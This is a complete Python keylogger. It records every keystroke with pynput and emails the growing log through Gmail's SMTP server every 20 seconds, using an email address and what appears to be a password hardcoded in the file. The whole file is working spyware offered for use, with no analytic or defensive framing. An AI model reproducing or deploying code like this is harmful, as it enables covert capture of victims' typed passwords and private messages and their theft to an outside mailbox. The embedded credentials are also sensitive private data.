import pynput.keyboard,smtplib,threading

class Keylogger():
  
  def __init__(self):
    self.store = "[+]KEYLOGGER STARTED \n"
  
  def app_key(self,string):
    self.store = self.store + string

  def press_key(self,key):
    try:
      self.app_key(str(key.char))
    except:
      if key == key.space:
        self.app_key(" ")
      else:
        self.app_key(str(key))

  def send_mail(self,id,psd,content):
    mail = smtplib.SMTP('smtp.gmail.com',587)
    mail.ehlo()
    mail.starttls()
    mail.login(id,psd)
    mail.sendmail(id,id,content)
    mail.close()

  def report(self):
    content = self.store
    self.send_mail("kcr1234554321@gmail.com","2015320301",content)
    timer = threading.Timer(20,self.report)
    timer.start()

  def start(self):
    key_listener = pynput.keyboard.Listener(on_press = self.press_key)
    self.report()
    key_listener.run()

key_log = Keylogger()
key_log.start()


